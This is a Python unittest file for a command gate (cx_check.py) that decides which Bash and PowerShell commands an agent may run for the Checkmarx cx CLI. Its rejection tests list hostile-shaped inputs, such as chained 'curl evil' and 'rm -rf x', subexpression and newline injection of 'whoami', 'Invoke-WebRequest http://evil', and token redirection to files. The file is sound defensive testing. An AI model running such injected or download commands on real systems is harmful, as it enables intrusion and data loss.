"""Tests for the shell-aware gate carve-outs in cx_check.py: the PowerShell auth-recovery path,
pinned-cx path-form tolerance ($HOME/~/$env:*), and the `cx version` diagnostic.

Dependency-free (stdlib unittest) so it runs on every OS with `python -m unittest`.
Run from the repo root:  python -m unittest discover -s tests -v
"""

import os
import tempfile
import unittest

from _gatelib import _HOME, _PIN, _URL_EU as _URL, _bash, _pwsh, _HistoryFileMixin, _PinnedCxMixin, cx_check


class PowerShellAuthRecoveryAccept(_PinnedCxMixin):
    def _ok(self, cmd):
        self.assertTrue(cx_check._is_auth_recovery_command(_pwsh(cmd)),
                        "PowerShell command wrongly rejected: %r" % cmd)

    def test_bare_auth_validate(self):
        self._ok("cx auth validate")

    def test_bare_cx_exe_form(self):
        self._ok("cx.exe auth validate")

    def test_bare_login_with_ps_null_sink(self):
        self._ok("cx auth login --base-auth-uri %s --tenant acme 1>$null" % _URL)

    def test_null_sink_case_insensitive(self):
        self._ok("cx auth login --base-auth-uri %s --tenant acme 1>$NULL" % _URL)

    def test_null_sink_with_space(self):
        self._ok("cx auth login --base-auth-uri %s --tenant acme > $null" % _URL)

    def test_configure_set(self):
        self._ok("cx configure set --prop-name cx_apikey --prop-value KEY")

    def test_call_operator_quoted_pinned_path(self):
        self._ok('& "%s" auth login --base-auth-uri %s --tenant acme 1>$null' % (_PIN, _URL))

    def test_call_operator_single_quoted(self):
        self._ok("& '%s' auth validate" % _PIN)

    def test_call_operator_no_space(self):
        self._ok('&"%s" auth validate' % _PIN)

    def test_canonical_store_accepted_alongside_pin(self):
        # CX_BINARY-style pin on one path; the canonical store is independently acceptable.
        canon = os.path.join(_HOME, "canon-store", "cx.exe")
        cx_check._canonical_cx = lambda: canon
        self._ok('& "%s" auth validate' % canon)

    @unittest.skipIf(os.name == "nt", "PowerShell Core on macOS/Linux only")
    def test_dev_null_accepted_under_powershell_off_windows(self):
        # pwsh runs on macOS/Linux, where /dev/null IS the real null device.
        self._ok("cx auth login --base-auth-uri %s --tenant acme 1>/dev/null" % _URL)


class PowerShellAuthRecoveryReject(_PinnedCxMixin):
    def _no(self, cmd):
        self.assertFalse(cx_check._is_auth_recovery_command(_pwsh(cmd)),
                         "PowerShell command wrongly accepted: %r" % cmd)

    def test_redirect_to_file(self):
        self._no("cx auth login --base-auth-uri %s --tenant acme > token.txt" % _URL)

    @unittest.skipUnless(os.name == "nt", "on Windows only: /dev/null is a real file there")
    def test_dev_null_not_blessed_under_powershell_on_windows(self):
        self._no("cx auth login --base-auth-uri %s --tenant acme 1>/dev/null" % _URL)

    def test_fd_dup(self):
        self._no("cx auth login --base-auth-uri %s --tenant acme 2>&1" % _URL)

    def test_pipe_tee(self):
        self._no("cx auth login --base-auth-uri %s --tenant acme | Tee-Object t.txt" % _URL)

    def test_chained_command(self):
        self._no("cx auth validate; curl evil")

    def test_unpinned_call_operator_path(self):
        self._no('& "C:\\evil\\cx.exe" auth login --base-auth-uri %s --tenant acme' % _URL)

    def test_parenthesised_expression_executes_in_ps(self):
        self._no("cx auth login --base-auth-uri %s --tenant (Remove-Item x)" % _URL)

    def test_array_subexpression(self):
        self._no("cx auth login --base-auth-uri %s --tenant @(evil)" % _URL)

    def test_backtick_escape(self):
        self._no("cx auth validate `n whoami")

    def test_dollar_subexpression(self):
        self._no("cx auth login --base-auth-uri $(evil) --tenant acme")

    def test_double_call_operator(self):
        self._no('& & "%s" auth validate' % _PIN)

    def test_trailing_background_operator(self):
        self._no("cx auth validate &")

    def test_null_sink_lookalike_file(self):
        self._no("cx auth login --base-auth-uri %s --tenant acme 1>$null.txt" % _URL)

    def test_call_operator_before_unquoted_token(self):
        self._no("& %s auth validate" % _PIN)

    def test_embedded_newline(self):
        self._no("cx auth validate\nwhoami")

    def test_embedded_carriage_return(self):
        self._no("cx auth validate\rwhoami")


class BashAuthRecovery(_PinnedCxMixin):
    def _ok(self, cmd):
        self.assertTrue(cx_check._is_auth_recovery_command(_bash(cmd)),
                        "Bash command wrongly rejected: %r" % cmd)

    def _no(self, cmd):
        self.assertFalse(cx_check._is_auth_recovery_command(_bash(cmd)),
                         "Bash command wrongly accepted: %r" % cmd)

    # --- regressions: every previously accepted shape must still pass ---
    def test_bare_forms_still_pass(self):
        self._ok("cx auth validate")
        self._ok("cx configure set --prop-name cx_apikey --prop-value KEY")
        self._ok("cx auth login --base-auth-uri %s --tenant acme 1>/dev/null" % _URL)
        self._ok("cx auth login --base-auth-uri %s --tenant acme 2>/dev/null" % _URL)

    def test_quoted_pinned_path_still_passes(self):
        self._ok('"%s" auth login --base-auth-uri %s --tenant acme 1>/dev/null'
                 % (_PIN.replace("\\", "/"), _URL))

    def test_exfiltration_still_rejected(self):
        self._no("cx auth login --base-auth-uri %s --tenant acme > token.txt" % _URL)
        self._no("cx auth validate; rm -rf x")

    def test_ps_null_sink_not_blessed_under_bash(self):
        # In Git-Bash `$null` is an ordinary file name — never a safe sink.
        self._no("cx auth login --base-auth-uri %s --tenant acme 1>$null" % _URL)

    # --- new path-form tolerance ---
    def test_home_variable_form(self):
        self._ok('"$HOME/.checkmarx/bin/cx" auth login --base-auth-uri %s --tenant acme '
                 "1>/dev/null" % _URL)

    def test_tilde_form_unquoted(self):
        self._ok("~/.checkmarx/bin/cx auth validate")

    def test_localappdata_variable_form(self):
        tmp = tempfile.mkdtemp(prefix="cx-lad-")
        orig = os.environ.get("LOCALAPPDATA")
        os.environ["LOCALAPPDATA"] = tmp
        self._pin_cx(os.path.join(tmp, "Checkmarx", "cx", "cx.exe"))
        try:
            self._ok('"$LOCALAPPDATA/Checkmarx/cx/cx.exe" auth validate')
        finally:
            if orig is None:
                os.environ.pop("LOCALAPPDATA", None)
            else:
                os.environ["LOCALAPPDATA"] = orig

    def test_expanded_but_unpinned_path_rejected(self):
        self._no('"$HOME/evil/cx" auth login --base-auth-uri %s --tenant acme' % _URL)

    def test_powershell_env_spelling_rejected_under_bash(self):
        self._no('"$env:LOCALAPPDATA/Checkmarx/cx/cx.exe" auth validate')

    def test_unknown_variable_rejected(self):
        self._no('"$FOO/cx" auth validate')

    @unittest.skipUnless(os.name == "nt", "backslash paths are Windows-only")
    def test_backslash_typed_pinned_path_now_accepted(self):
        self._ok('"%s" auth validate' % _PIN.replace("/", "\\"))


class CxVersionDiagnostic(_PinnedCxMixin):
    """`cx version` — and ONLY `cx version` — must run even on a build the version gate rejects."""

    def _ok(self, hook_input):
        self.assertTrue(cx_check._is_cx_version_command(hook_input))

    def _no(self, hook_input):
        self.assertFalse(cx_check._is_cx_version_command(hook_input))

    def test_version_bare_both_tools(self):
        self._ok(_bash("cx version"))
        self._ok(_pwsh("cx version"))
        self._ok(_bash("cx.exe version"))
        self._ok(_bash("  cx   version  "))

    def test_pinned_path_forms(self):
        self._ok(_bash('"%s" version' % _PIN.replace("\\", "/")))
        self._ok(_pwsh('& "%s" version' % _PIN))
        self._ok(_bash('"$HOME/.checkmarx/bin/cx" version'))

    def test_rejects_anything_beyond_the_bare_shape(self):
        self._no(_bash("cx version --debug"))
        self._no(_bash("cx version; ls"))
        self._no(_bash("cx version > v.txt"))
        self._no(_bash("cx version 1>/dev/null"))  # anchored shape — even a null sink is rejected
        self._no(_bash("cx versionx"))
        self._no(_bash('"/somewhere/else/cx" version'))
        self._no({"tool_name": "Write", "tool_input": {"command": "cx version"}})

    def test_no_auth_subcommand_is_a_version_diagnostic(self):
        # The diagnostic carve-out bypasses the VERSION gate, so it stays as narrow as possible:
        # `cx auth validate` deliberately does NOT qualify (in a version-broken state the remedy is
        # the installer, not auth). All of these are still admitted by the auth-recovery carve-out.
        for cmd in ("cx auth validate",
                    "cx auth validate --timeout 30s",
                    "cx auth --help",
                    "cx auth login --base-auth-uri %s --tenant acme" % _URL,
                    "cx auth logout",
                    "cx configure set --prop-name cx_apikey --prop-value KEY"):
            self._no(_bash(cmd))
            self._no(_pwsh(cmd))
            self.assertTrue(cx_check._is_auth_recovery_command(_bash(cmd)),
                            "should still be an auth-recovery command: %r" % cmd)


class InstalledVersionInDenyMessage(_PinnedCxMixin):
    """A below-minimum deny must be able to state BOTH numbers, so the agent never has to run
    `cx version` just to tell the developer which build they have."""

    def test_note_renders_when_version_is_readable(self):
        cx_check._cx_version = lambda: "Checkmarx One CLI 2.4.0 (build abc)"
        self.assertEqual(cx_check._installed_version_note(), " v2.4.0")

    def test_note_is_empty_when_version_is_unreadable(self):
        for broken in (None, "", "no version here"):
            cx_check._cx_version = lambda: broken
            self.assertEqual(cx_check._installed_version_note(), "")

    def test_note_never_raises(self):
        def boom():
            raise RuntimeError("cx exploded")
        cx_check._cx_version = boom
        self.assertEqual(cx_check._installed_version_note(), "")

    def setUp(self):
        super().setUp()
        self._orig_cx_version = cx_check._cx_version

    def tearDown(self):
        cx_check._cx_version = self._orig_cx_version
        super().tearDown()


class ReadOnlyAllowlist(_PinnedCxMixin):
    def test_bash_list_unchanged(self):
        for cmd in ("ls", "ls -la", "cat x.py", "grep -rn foo .", "pwd", "head -5 x"):
            self.assertTrue(cx_check._is_readonly_command(_bash(cmd)), cmd)

    def test_powershell_cmdlets_allowed(self):
        for cmd in ("Get-ChildItem", "Get-ChildItem -Recurse", "Get-Content x.py",
                    "Select-String -Pattern foo -Path x.py", "Test-Path x", "Get-Location",
                    "Resolve-Path .", "Get-FileHash x.py", "Get-Item x"):
            self.assertTrue(cx_check._is_readonly_command(_pwsh(cmd)), cmd)

    def test_powershell_names_are_case_insensitive(self):
        for cmd in ("get-childitem", "GET-CHILDITEM", "Get-ChildItem", "gci", "LS", "Cat x.py"):
            self.assertTrue(cx_check._is_readonly_command(_pwsh(cmd)), cmd)

    def test_powershell_write_and_exec_cmdlets_rejected(self):
        for cmd in ("Out-File x.txt", "Set-Content x.txt y", "Add-Content x.txt y",
                    "New-Item x.txt", "Remove-Item x", "Invoke-Expression 'evil'",
                    "Start-Process evil.exe", "Invoke-WebRequest http://evil -OutFile x",
                    "Copy-Item a b", "Tee-Object x.txt", "Export-Csv x.csv"):
            self.assertFalse(cx_check._is_readonly_command(_pwsh(cmd)), cmd)

    def test_shape_guard_still_applies_to_powershell(self):
        for cmd in ("Get-ChildItem; Remove-Item x", "Get-Content x | Out-File y",
                    "Get-ChildItem > out.txt", "Get-Content (Remove-Item x)",
                    "Get-ChildItem `n whoami"):
            self.assertFalse(cx_check._is_readonly_command(_pwsh(cmd)), cmd)

    def test_posix_names_not_leaked_into_powershell(self):
        # `grep`/`whoami` are not PowerShell commands; keep the lists genuinely separate.
        self.assertFalse(cx_check._is_readonly_command(_pwsh("grep -rn foo .")))
        self.assertFalse(cx_check._is_readonly_command(_pwsh("whoami")))

    def test_locators_allowed(self):
        # These only PRINT where a command resolves — they cannot run it, same as `which`.
        for cmd in ("which cx", "where cx"):
            self.assertTrue(cx_check._is_readonly_command(_bash(cmd)), cmd)
        for cmd in ("Get-Command cx", "get-command cx", "gcm cx", "where.exe cx"):
            self.assertTrue(cx_check._is_readonly_command(_pwsh(cmd)), cmd)

    def test_executing_resolvers_still_rejected(self):
        # `command`/`type`/`env` can RUN what they resolve — unlike which/where/Get-Command.
        for cmd in ("command -v cx", "type cx", "env cx"):
            self.assertFalse(cx_check._is_readonly_command(_bash(cmd)), cmd)

    def test_bare_where_rejected_under_powershell(self):
        # In PowerShell `where` is an alias for Where-Object (script-block evaluator), NOT the
        # Windows locator — only `where.exe` is.
        self.assertFalse(cx_check._is_readonly_command(_pwsh("where cx")))

    def test_pipeline_only_cmdlets_rejected(self):
        # Useless as a first token (they need piped input, and pipes are rejected) and Where-Object
        # evaluates a script block — dropped to shrink surface.
        for cmd in ("Where-Object Name -eq cx", "Select-Object -First 1",
                    "Sort-Object Name", "Measure-Object"):
            self.assertFalse(cx_check._is_readonly_command(_pwsh(cmd)), cmd)

    def test_script_block_rejected_under_powershell(self):
        for cmd in ("Get-ChildItem { evil }", "Get-Content x -Filter { evil }"):
            self.assertFalse(cx_check._is_readonly_command(_pwsh(cmd)), cmd)
        self.assertFalse(cx_check._is_auth_recovery_command(
            _pwsh("cx auth login --tenant { evil }")))


class DocumentedCommandsPassTheGate(_PinnedCxMixin):
    """Contract test: the commands the cx-cli-setup skill tells the agent to run must actually be
    admitted. The old Phase 0 probe (`which cx 2>/dev/null || where cx 2>nul`) was rejected by the
    shape guard, so the agent hit a wall on step one and handed the command to the developer."""

    def test_phase0_discovery_commands(self):
        for wrap, cmd in ((_bash, "which cx"),
                          (_bash, "cx auth validate"),
                          (_pwsh, "Get-Command cx"),
                          (_pwsh, "where.exe cx"),
                          (_pwsh, "cx auth validate")):
            admitted = (cx_check._is_readonly_command(wrap(cmd))
                        or cx_check._is_auth_recovery_command(wrap(cmd))
                        or cx_check._is_cx_version_command(wrap(cmd)))
            self.assertTrue(admitted, "documented Phase 0 command is blocked: %r" % cmd)

    def test_phase1a_canonical_store_checks(self):
        self.assertTrue(cx_check._is_readonly_command(_bash('ls -l "$HOME/.checkmarx/bin/cx"')))
        self.assertTrue(cx_check._is_readonly_command(
            _pwsh('Test-Path "$env:LOCALAPPDATA\\Checkmarx\\cx\\cx.exe"')))

    def test_the_old_broken_probe_is_still_rejected(self):
        # Kept as a regression marker: if someone re-adds a chained probe to the docs, this shows
        # exactly why it cannot work.
        self.assertFalse(cx_check._is_readonly_command(
            _bash("which cx 2>/dev/null || where cx 2>nul")))

    def test_non_shell_tool_and_opt_out(self):
        self.assertFalse(cx_check._is_readonly_command(
            {"tool_name": "Write", "tool_input": {"command": "ls"}}))
        os.environ["CX_GATE_ALL_COMMANDS"] = "1"
        try:
            self.assertFalse(cx_check._is_readonly_command(_bash("ls")))
            self.assertFalse(cx_check._is_readonly_command(_pwsh("Get-ChildItem")))
        finally:
            os.environ.pop("CX_GATE_ALL_COMMANDS", None)


class BootstrapStaysBashOnly(_PinnedCxMixin):
    def test_bootstrap_rejects_powershell(self):
        cmd = 'bash "%s" install' % cx_check._bootstrap_script_path()
        self.assertTrue(cx_check._is_bootstrap_command(_bash(cmd)))
        self.assertFalse(cx_check._is_bootstrap_command(_pwsh(cmd)))

    def test_bare_bash_command_is_none_for_powershell(self):
        self.assertIsNone(cx_check._bare_bash_command(_pwsh("cx auth validate")))


class ShellShapedRecoveryCommands(_PinnedCxMixin):
    """Deny messages must hand each tool a command that tool can actually run (P6)."""

    def test_powershell_token_uses_call_operator(self):
        self.assertTrue(cx_check._cx_command_token("powershell").startswith('& "'))
        self.assertFalse(cx_check._cx_command_token("bash").startswith("&"))

    def test_rendered_commands_round_trip_through_the_carveout(self):
        for shell, wrap in (("bash", _bash), ("powershell", _pwsh)):
            cmd = cx_check._cx_recovery_command_str(
                "auth login --base-auth-uri %s --tenant acme" % _URL, shell)
            self.assertTrue(cx_check._is_auth_recovery_command(wrap(cmd)),
                            "rendered %s command rejected by carve-out: %r" % (shell, cmd))

    def test_history_bullet_commands_round_trip_per_shell(self):
        history = [(_URL, "acme-corp")]
        for shell, wrap in (("bash", _bash), ("powershell", _pwsh)):
            bullet = cx_check._oauth_recovery_bullet({}, history, shell)
            commands = [ln.strip() for ln in bullet.splitlines()
                        if "auth login --base-auth-uri https" in ln]
            self.assertTrue(commands)
            for cmd in commands:
                if shell == "powershell":
                    self.assertIn("&", cmd)
                self.assertTrue(cx_check._is_auth_recovery_command(wrap(cmd)),
                                "history command rejected for %s: %r" % (shell, cmd))

    def test_admin_bullet_commands_round_trip_per_shell(self):
        cfg = {"cx_base_auth_uri": _URL, "cx_tenant": "acme"}
        for shell, wrap in (("bash", _bash), ("powershell", _pwsh)):
            bullet = cx_check._oauth_recovery_bullet(cfg, [], shell)
            cmd = bullet.strip().splitlines()[-1].strip()
            self.assertTrue(cx_check._is_auth_recovery_command(wrap(cmd)),
                            "admin command rejected for %s: %r" % (shell, cmd))

    def test_shell_for_tool_mapping(self):
        self.assertEqual(cx_check._shell_for_tool("PowerShell"), "powershell")
        self.assertEqual(cx_check._shell_for_tool("Bash"), "bash")
        self.assertEqual(cx_check._shell_for_tool("Write"), "bash")
        self.assertEqual(cx_check._shell_for_tool(None), "bash")


class PowerShellLoginRecording(_HistoryFileMixin):
    """A PowerShell-admitted login must feed the login-history feature."""

    def test_shell_command_returns_powershell_command(self):
        cmd = "cx auth login --base-auth-uri %s --tenant acme 1>$null" % _URL
        self.assertEqual(cx_check._shell_command(_pwsh(cmd)), (cmd, "powershell"))

    def test_parse_login_flags_on_call_operator_form(self):
        self.assertEqual(
            cx_check._parse_login_flags(
                '& "%s" auth login --base-auth-uri %s --tenant acme 1>$null' % (_PIN, _URL)),
            (_URL, "acme"))

    def test_record_login_attempt_end_to_end(self):
        command, _shell = cx_check._shell_command(_pwsh(
            '& "%s" auth login --base-auth-uri %s --tenant acme 1>$null' % (_PIN, _URL)))
        cx_check._record_login_attempt(command, self.path)
        entries = cx_check._load_login_history(self.path)
        self.assertEqual(entries[0]["tenant"], "acme")
        self.assertEqual(entries[0]["status"], "pending")


if __name__ == "__main__":
    unittest.main()
